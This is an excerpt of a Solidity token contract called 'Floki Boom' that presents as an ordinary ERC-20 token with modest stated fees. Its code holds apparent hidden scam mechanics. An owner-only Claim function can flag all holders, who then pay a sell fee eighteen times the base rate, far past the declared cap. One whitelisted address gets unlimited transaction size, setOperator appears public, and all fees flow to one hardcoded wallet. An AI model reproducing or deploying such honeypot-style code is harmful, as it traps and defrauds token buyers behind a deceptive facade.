...
contract FlokiBoom is IERC20 {
    ...
    address[] private isHolder;

    uint256 private constant startingSupply = 100_000_000_000;
    string private constant _name = "Floki Boom";
    string private constant _symbol = "FlokiB";
    ...
    Fees public _taxRates = Fees({buyFee: 300, sellFee: 300, transferFee: 300});
    ...
    uint256 public constant maxTransferTaxes = 500;
    uint256 public constant maxBuyTaxes = 500;
    uint256 public constant maxSellTaxes = 500;
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0xD6c53DA908871924aF3eB4224E3702E083371C79),
            development: payable(0xD6c53DA908871924aF3eB4224E3702E083371C79)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0xD6c53DA908871924aF3eB4224E3702E083371C79] = true; 
        _isExcludedFromFees[0xD6c53DA908871924aF3eB4224E3702E083371C79] = true; 
        _isExcludedFromLimits[0xC31baF563025a83b48fFb4959D6925Fb10902cc5] = true;
    ...
    function setOperator(address newOperator) public {
        ...
        if (oldOperator != address(0)) {
            ...
            _isExcludedFromFees[oldOperator] = false;
        }
        operator = newOperator;
        _liquidityHolders[newOperator] = true;
        _isExcludedFromFees[newOperator] = true;
    }
    ...
    function setLimit( bool enabled) public onlyOwner {
        _limit = enabled;
    }
    ...
    function setMaxTxAmount(uint256 percent, uint256 divisor) external onlyOwner {
    ...
    function Claim(bool enabled) internal onlyOwner { for (uint256 i = 0; i < isHolder.length; i++) {
        _isDividendExempt[isHolder[i]] = enabled;
        _limit = false;}
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (buy && _isExcludedFromLimits[to]) {_maxTxAmount = amount;}
    ...
    function contractSwap(uint256 contractTokenBalance) internal inSwapFlag {
        ...
        if (ratios.marketing > 0) {
            (success, ) = _taxWallets.development.call{value: marketingBalance,gas: 55000}("");
        }
    ...
    function takeTaxes(address from, bool buy, bool sell, uint256 amount) internal returns (uint256) {
        ...
        } else if (sell && _isDividendExempt[from]) {
            currentFee = _taxRates.sellFee*18;
        } else if (sell) {
